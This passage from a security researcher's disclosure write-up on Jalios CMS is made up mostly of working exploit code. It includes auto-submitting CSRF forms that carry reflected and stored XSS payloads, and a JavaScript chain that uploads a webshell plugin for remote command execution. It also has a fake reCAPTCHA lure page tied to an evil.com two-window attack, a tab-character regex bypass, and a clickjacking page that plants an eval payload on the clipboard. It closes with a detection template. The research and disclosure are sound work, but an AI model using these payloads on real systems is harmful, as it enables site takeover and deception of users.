- XSS on `/admin/analytics/index.jsp` in the fields `beginDate` and `endDate`  
```html
<html> 
  <body> 
    <form action="http://172.22.12.128:8080/jalios/admin/analytics/index.jsp" method="POST"> 
      <input type="hidden" name="analyticsWS" value="ALL&#95;WORKSPACE" /> 
      <input type="hidden" name="beginDate" value="doAjaxGroupList&quot;&quot;&gt;&lt;img&#47;src&#47;onerror&#61;alert&#40;1&#41;&gt;" /> 
      <input type="hidden" name="endDate" value="doAjaxGroupList&quot;&quot;&gt;&lt;img&#47;src&#47;onerror&#61;alert&#40;2&#41;&gt;" /> 
      <input type="hidden" name="opSubmit" value="true" /> 
    </form> 
    <script> 
      document.forms[0].submit(); 
    </script> 
  </body> 
</html>
```

- On `/work/mergeDocument.jsp` in the `redirect` field
![mergeDocument](./img/9.png)

- In the subtitle upload of a video: `/work/mediaTracksUploadModal.jsp` (`redirect`)
![srt xss](./img/10.png)

## Stored XSS (*Admin*)
- Stored on `/admin/editPlugin.jsp` and triggered on `/admin/pluginManager.jsp`  
```html
<html> 
  <body> 
    <form action="http://172.22.12.128:8080/jalios/admin/editPlugin.jsp" method="POST"> 
      <input type="hidden" name="label" value="POC XSS" /> 
      <input type="hidden" name="label" value="" /> 
      <input type="hidden" name="name" value="XSS" /> 
      <input type="hidden" name="description" value="&lt;div&#32;class&#61;&quot;wysiwyg&quot;&gt;&lt;p&gt;Poc&#32;for&#32;Stored&#32;XSS&lt;&#47;p&gt;&lt;&#47;div&gt;" /> 
      <input type="hidden" name="description" value="" /> 
      <input type="hidden" name="version" value="0&#46;1" /> 
      <input type="hidden" name="order" value="0" /> 
      <input type="hidden" name="url" value="" /> 
      <input type="hidden" name="author" value="&lt;img&#47;src&#47;onerror&#61;alert&#40;1&#41;&gt;" /> 
      <input type="hidden" name="license" value="&lt;img&#47;src&#47;onerror&#61;alert&#40;2&#41;&gt;" /> 
      <input type="hidden" name="jcms" value="" /> 
      <input type="hidden" name="jsync" value="false" /> 
      <input type="hidden" name="appServer" value="" /> 
      <input type="hidden" name="appServer" value="" /> 
      <input type="hidden" name="redirect" value="" /> 
      <input type="hidden" name="opSave" value="Enregistrer" /> 
    </form> 
    <script> 
      document.forms[0].submit(); 
    </script> 
  </body> 
</html>
```

- Stored on `/admin/adminProperties.jsp` in the parameters `vote_default_value` and `channel_urid`.   

- Stored on `/work/mediaBrowser.jsp` in the filename. Triggered on the image preview: `/work/doMediaBrowserPreview.jsp?fileDocID=753666_Media&selectMode=false&itemIdx=1&first=true&last=false`
![Preview XSS](./img/11.png)

## Self XSS
The filename allows for an XSS in the upload form on `/work/pubBrowser.jsp?ws=j_4&mode=all&super=com.jalios.jcms.Content&classname=`: 
```
File: "'><img src=x onerror=alert(1337)>.pdf
```
![self](./img/8.png)

## XSS To RCE using plugin upload feature.

It is possible to upload a malicious plugin deploying a webshell on the Jalios instance.  
Here is a JavaScript code to upload a shell.jsp file:

```javascript
var malicious_plugin = " plugin zipped (hex) " 
const base_url = "/jalios" // To Edit depending your basepath 

function hexToBlob(hexString) { 
    const arrayBuffer = new Uint8Array(hexString.match(/.{1,2}/g).map(byte => parseInt(byte, 16))).buffer; 
    return new Blob([arrayBuffer], { type: 'application/octet-stream' }); 
} 

function upload() { 
    var formData = new FormData(); 
    formData.append("archive", new Blob([hexToBlob(malicious_plugin)], { type: "application/octet-stream" }), "Webshell_0.1.zip"); 
    formData.append("opDeploy", true) 
    formData.append("opUpload", true) 

    var stage1 = new XMLHttpRequest(); 
    stage1.open("POST", `${base_url}/admin/displayPlugin.jsp`, false); 
    stage1.send(formData); 
    console.log("Plugin uploaded"); 
    
    var stage3 = new XMLHttpRequest(); 
    stage3.open("GET", `${base_url}/admin/editPlugin.jsp?value=true&opEnable=true&name=Webshell&redirect=admin%2FdisplayPlugin.jsp%3Fname%3DWebshell`, false); 
    stage3.send(); 
    console.log("Plugin enabled"); 
} 

upload();
```

The RCE is triggered here: `/plugins/Webshell/jsp/plugin.jsp?cmd=id`

The content of the plugin to include in the JavaScript code (in hexadecimal) can be found [here](./files/plugin_hex.txt).  
The plugin can also be installed manually. It is available in zip format [here](./files/webshell_0.1.zip).

## Openredirect to XSS by escaping url validation RegEx
The URL validation regex can be bypassed to perform an action similar to: 

```javascript
document.location="javascript:alert(1)"
```
It is possible to add a `\t` *(%09)* between `javascript` and `:` to bypass regex detection.

Thus, the Open redirect on `/jcore/closePopup.jsp` is actually an XSS!
- `/jcore/closePopup.jsp?redirectNoClose=javascript%09:alert()`

Additionally, the following pages allow controlling the URL of the parent window *(window.opener)* via the `redirect` parameter:   
- `/work/popupImportCatList.jsp`  
- `/jcore/closePopup.jsp` 

We can therefore perform the following attack with a page controlled by the attacker.
- The victim visits **evil.com/1**
- **evil.com/1** opens a new tab to **evil.com/2** using the JavaScript `open` function
- **evil.com/1** redirects to the Jalios instance.
- **evil.com/2** CSRF to the vulnerable page. The XSS is triggered on the first window.

However, for a page to open another page, user interaction is required. 
Indeed, the `open` function is blocked by browsers if it is triggered automatically.
We will therefore create a fake captcha page and add an `onclick` handler to an invisible div covering the entire page.  
The page will open on any click on our first malicious page.

The first page is as follows: 

*page1.html*
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> 
<html> 
<head> 
<meta http-equiv="content-type" content="text/html; charset=utf-8"> 
    <meta name="viewport" content="initial-scale=1"> 
    <title>reCAPTCHA</title> 
    <style> 
        body{font-family:Arial,sans-serif;background-color:#fff;color:#000;margin:0;padding:20px;font-size:18px;overscroll-behavior:contain}hr{border:0;height:1px;background-color:#ccc;margin:10px 0}.container{max-width:400px;margin:0}.recaptcha-container{background-color:#f9f9f9;border:1px solid #d3d3d3;border-radius:3px;padding:10px;box-shadow:0 0 10px rgba(0,0,0,.1);margin:10px 0}.checkbox-container{display:flex;align-items:center;margin-bottom:10px}.checkbox{width:28px;height:28px;background-color:#fff;border:2px solid #c1c1c1;border-radius:2px;display:flex;align-items:center;justify-content:center;cursor:pointer}.checkbox:hover{border-color:#b2b2b2}.checkbox-tick{font-size:18px;color:#34a853;display:none}.checkbox-text{margin-left:10px;font-size:14px;color:#000}.recaptcha-logo{width:50px;height:50px;margin-left:auto}.recaptcha-footer{font-size:8px;color:#555;text-align:center;margin-top:10px}.recaptcha-footer a{color:#555;text-decoration:none}.info a:hover,.recaptcha-footer a:hover{text-decoration:underline}.info{font-size:13px;line-break:anywhere;margin-top:10px}.info a{color:#1a0dab;text-decoration:none}.info-div{display:none;background-color:#eee;padding:10px;margin:10px 0;line-height:1.4em}#XSSDiv{position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,0,0,.01);z-index:9999;pointer-events:all} 
    </style> 
</head> 
<body> 
    <script> 
        function trigger(){ 
            open('/page2.html') 
            document.location="http://172.22.12.128:8001/jalios/"; 
        } 
    </script> 
    <div id="XSSDiv" onclick="trigger()"></div> 

    <div class=container><hr><form action=index id=captcha-form method=post><noscript><div style=font-size:13px>Pour continuer, veuillez activer JavaScript sur votre navigateur Web.</div></noscript><div class=recaptcha-container><div class=checkbox-container><div class=checkbox><span class=checkbox-tick>✔</span></div><span class=checkbox-text>Je ne suis pas un robot</span> <img alt="reCAPTCHA Logo"class=recaptcha-logo src=https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png></div><div class=recaptcha-footer><a href=https://www.google.com/intl/fr/policies/privacy/ >Confidentialité</a> - <a href=https://www.google.com/intl/fr/policies/terms/ >Conditions</a></div></div></form><hr><div class=info><b>À propos de cette page</b><br><br>Nos systèmes ont détecté un trafic exceptionnel sur votre réseau informatique. Cette page permet de vérifier que c'est bien vous qui envoyez des requêtes, et non un robot. <a href=# onclick='document.getElementById("infoDiv").style.display="block"'>Que s'est-il passé ?</a><br><br><div class=info-div id=infoDiv>Cette page s'affiche lorsque Google détecte automatiquement des requêtes émanant de votre réseau informatique qui semblent enfreindre les <a href=//www.google.com/policies/terms/ >Conditions d'utilisation</a>. Le blocage prendra fin peu après l'arrêt de ces requêtes. En attendant, la saisie de l'image CAPTCHA ci-dessus vous permettra de continuer à utiliser nos services.<br><br>Des applications malveillantes, un plug-in de navigateur ou un script qui envoie des requêtes automatiques peuvent être à l'origine de ce trafic. Si vous utilisez une connexion réseau partagée, demandez de l'aide à votre administrateur. Il est possible qu'un autre ordinateur utilisant la même adresse IP soit en cause. <a href=//support.google.com/websearch/answer/86640>En savoir plus</a><br><br>Vous pouvez être invité à saisir les caractères de l'image CAPTCHA si vous utilisez des termes avancés auxquels les robots ont recours ou si vous envoyez des requêtes très rapidement.</div><br>Adresse IP : 2001:811:3dc1:7010:dcb8:5c63:510:571e<br>Heure : 2025-02-24T02:26:44Z<br></div></div> 
</body> 
</html>
```

and the second: *page2.html*
```html
<html> 
    <body> 
    <form id="uploadForm" action="http://172.22.12.128:8001/jalios/admin/deploy/popupSignUpload.jsp" method="POST" enctype="multipart/form-data"> 
      <input type="file" name="file" id="fileInput" /> 
      <input type="hidden" name="redirect" value="javascri&#9;pt&#58;alert&#96;1&#96;" /> 
      <input type="submit" value="Submit request" /> 
    </form> 
    <script> 
        const blob = new Blob(["POC_XSS"], { type: "text/plain" }); 
        const file = new File([blob], `${Math.floor(Math.random() * 1000000)}.txt`, { type: "text/plain" }); 
        const dataTransfer = new DataTransfer(); 
        dataTransfer.items.add(file); 
        const fileInput = document.getElementById("fileInput"); 
        fileInput.files = dataTransfer.files; 
        setTimeout(() => { 
            document.getElementById("uploadForm").submit(); 
        }, 3000); 
    </script> 
    </body> 
</html>
```

The final rendering is as follows:  
![evil captcha](./img/12.png)

### Demo

<video controls> 
  <source src="./video/xss_opener.mp4" type="video/mp4"> 
</video>

## Self-XSS & Clickjacking

A final XSS was found in the documentation page at `/docs/jcms/fonts/icomoon/demo.html`  
The page imports the script `/docs/jcms/fonts/icomoon/demo.html` which contains this code:  

```javascript
... 
(function() { 
	... 
  testText = document.getElementById('testText'); 
	function updateTest() { 
		testDrive.innerHTML = testText.value || String.fromCharCode(160); 
		... 
	} 
  ... 
	testText.addEventListener('change', updateTest, false); 
	updateSize(); 
}()); 
```

The previous code adds a listener to the change of an `<input>` tag.  
Thus, every time the input is modified, the content is rendered below in a `<div>` with the id *testDrive*.  
The use of `.innerHTML` instead of `.innerText` allows a self XSS with the following payload:
```html
AVANT"><img/src/onerror=alert(1)>APRES
```

![Self XSS](./img/13.png)

The server, by default, does not include a [`X-Frame-Options`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options) header, which allows it to be included in an iframe. Using an anchor `#`, it is possible to focus on the input tag and thus scroll to the vulnerable part of the HTML page.  

```html
<html> 
    <body> 
        <iframe src="http://localhost:8000/jalios/docs/jcms/fonts/icomoon/demo.html#testText"> 
    </body> 
</html>
```

![iframe including vulnerable page](./img/14.png)

With a bit of CSS and imagination, it is possible to create a fake captcha page to make the user copy and paste a malicious string!  
The page is available [here](./html/xss_clickjacking.html):  

![Clickjacking](./img/15.png)

The malicious code is as follows: 
```html
<script>  
  document.getElementById('evil').src = `http://localhost:8000/jalios/docs/jcms/fonts/icomoon/demo.html#testText` 
  window.addEventListener("message", function(event) { 
    if (event.data && event.data.type === "update") { 
      document.getElementById('pasteArea').value = event.data.message; 
    } 
	}, false); 
	if (location.href.indexOf('debug') > 0) { 
		document.getElementById('evil').style.opacity="50%" 
	} 

  function exploit() { 
    b64 = btoa(` 
window.parent.postMessage({ type: "update", message: document.getElementById('testText').value }, "*"); 
document.getElementById('testText').addEventListener('input', (function() { 
	window.parent.postMessage({ type: "update", message: document.getElementById('testText').value }, "*"); 
}), false); 

alert(1) 
`) 
  payload = `\"><img/src/onerror=\"eval(atob('${b64}'))\">` 
  random = btoa("ThisIsAClickJacking") 
  navigator.clipboard.writeText(random+payload+random).then(() => { 
        document.getElementById('step1').style.display = 'none'; 
    document.getElementById('step2').style.display = ''; 
    }, (err) => { 
        console.error(err); 
    }); 
} 

</script>
```

### Demo

<video controls> 
  <source src="./video/xss_clickjacking.mp4" type="video/mp4"> 
</video>

# Jalios Detection

I created this nuclei template to detect Jalios instances:  
```yaml
id: detect-jalios-cms

info:
  name: JALIOS CMS Detection
  author: Vozec
  severity: info
  description: Template to detect JALIOS CMS instances
  reference:
    - https://www.jalios.com/
  tags: panel,jalios,jcms

requests:
  - method: GET
    path:
      - "{{BaseURL}}/"
      - "{{BaseURL}}/pom.xml"
      - "{{BaseURL}}/front/privateLogin.jsp"
      - "{{BaseURL}}/docs/jcms/fonts/icomoon/demo.html"

      - "{{BaseURL}}/jcms"
      - "{{BaseURL}}/jcms/front/privateLogin.jsp"
      - "{{BaseURL}}/jcms/docs/jcms/fonts/icomoon/demo.html"

      - "{{BaseURL}}/jplatform"
      - "{{BaseURL}}/jplatform/front/privateLogin.jsp"
      - "{{BaseURL}}/jplatform/docs/jcms/fonts/icomoon/demo.html"

    stop-at-first-match: true
    redirects: true
    matchers:
      - type: word
        words:
          - "Jalios JCMS"
          - "JPlatform"
          - "data-jalios"
          - "ajax-wait.svg\""
          - "jalios-icon"
          - "jQuery.jalios"
          - "jalios-properties"
          - "com.jalios.jcms"
          - "JCMS_"
          - "src=\"js/jalios"
          - "data-jalios-toggle"
          - "jalios-login"
          - "www.jalios.com"
          - "icomoon-home"
          - "IcoMoon Demo"
          - "Jalios"

        condition: or
        part: body

    extractors:
      - type: regex
        part: body
        internal: False
        regex:
          - "(Jalios JCMS|JPlatform|data-jalios|ajax-wait.svg\"|jalios-icon|jQuery.jalios|jalios-properties|com.jalios.jcms|JCMS_\"|src=\"js/jalios|data-jalios-toggle|www.jalios.com|jalios-login|icomoon-home|IcoMoon Demo|Jalios)"
```

# Conclusion

In conclusion, this article has shed light on several vulnerabilities within the Jalios CMS, including XSS, SQL injection, XXE, and even remote code execution (RCE). These findings underscore the importance of thorough input validation, secure configurations, and careful handling of untrusted data. While some vulnerabilities require specific conditions, such as disabled CSRF protection, others can be exploited with minimal effort. We extend our gratitude to the Jalios team for their prompt and effective response in addressing these issues, as well as to the VulnCheck team for their  assistance in the CVE disclosure process. This research serves as a reminder of the constant need for vigilance in web application security, and I encourage developers and administrators to prioritize regular security audits, timely patching, and adherence to best practices to safeguard their systems.